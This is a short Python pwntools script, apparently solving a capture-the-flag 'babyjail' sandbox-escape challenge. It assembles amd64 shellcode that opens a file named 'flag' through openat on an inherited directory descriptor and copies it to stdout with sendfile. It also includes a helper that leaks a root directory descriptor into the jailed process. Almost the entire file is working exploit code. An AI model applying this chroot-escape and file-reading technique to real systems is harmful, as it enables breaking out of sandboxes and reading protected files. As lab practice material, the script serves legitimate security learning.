'''
openat
'''

from pwn import *
context.arch = "amd64"


my_sc = asm('''

    push 0x67616c66
    mov rdi, 0x3
    mov rax, SYS_openat
    mov rsi, rsp
    xor rdx, rdx
    syscall

    /* call sendfile(1, 'rax', 0, 0x7fffffff) */
    mov r10d, 0x7fffffff
    mov rsi, rax
    push SYS_sendfile /* 0x28 */
    pop rax
    push 1
    pop rdi
    cdq /* rdx=0 */
    syscall

''')
# display the bytes
print(disasm(my_sc))
# fd = open("ttt-raw","wb+")
# fd.write(my_sc)
# fd.close()
def preexec_openfd():
    fd = os.open("/", flags=0x20000)
    os.dup2(3, fd)

# p = process("/challenge/babyjail_level8", close_fds=False, preexec_fn=preexec_openfd)
# # context.terminal = ['tmux', 'splitw', '-h']  # Attempting to use multixterm
# # p = gdb.debug(["/challenge/babyjail_level3", "/"], gdbscript="source /opt/gef/gef.py")
# p.send(my_sc)

with open("ttt-raw", "wb+") as fd:
    fd.write(my_sc)
# all = p.recvall()
# print(all.decode())